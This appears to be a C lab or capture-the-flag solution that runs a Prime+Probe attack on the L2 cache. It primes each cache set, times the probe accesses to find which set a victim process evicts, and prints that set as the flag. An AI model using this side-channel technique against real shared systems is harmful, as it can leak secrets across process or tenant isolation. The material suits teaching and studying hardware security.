#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>
#define BUFF_SIZE (1<<21)

int main(int argc, char const *argv[]) {
    int flag = -1;
    char *buf = alloc_buffer();
    if (buf == NULL) {
        return 1;
    }
    uint64_t totals[NUM_L2_SETS];
    memset(totals, 0, sizeof(totals));
    volatile char sink = 0;
    for (int round = 0; round < ROUNDS; round++) {
        for (int set = 0; set < NUM_L2_SETS; set++) {
            // PRIME: fill this candidate set with our own lines
            for (int way = 0; way < L2_WAYS; way++) {
                char *addr = buf + (set * LINE_SIZE) + (way * SET_STRIDE);
                sink ^= *addr;
            }
            // Small pause so victim can keep running
            for (volatile int delay = 0; delay < 100; delay++) { }
            // PROBE: measure whether victim evicted our lines
            uint64_t sum = 0;
            for (int way = L2_WAYS - 1; way >= 0; way--) {
                char *addr = buf + (set * LINE_SIZE) + (way * SET_STRIDE);
                sum += measure_one_block_access_time((uint64_t)addr);
            }
            totals[set] += sum;
        }
    }
    uint64_t max_score = 0;
    for (int set = 0; set < NUM_L2_SETS; set++) {
        if (totals[set] > max_score) {
            max_score = totals[set];
            flag = set;
        }
    }
    printf("Flag: %d\n", flag);
    if (sink == 255) {
        fprintf(stderr, "sink=%d\n", sink);
    }
    return 0; 
}

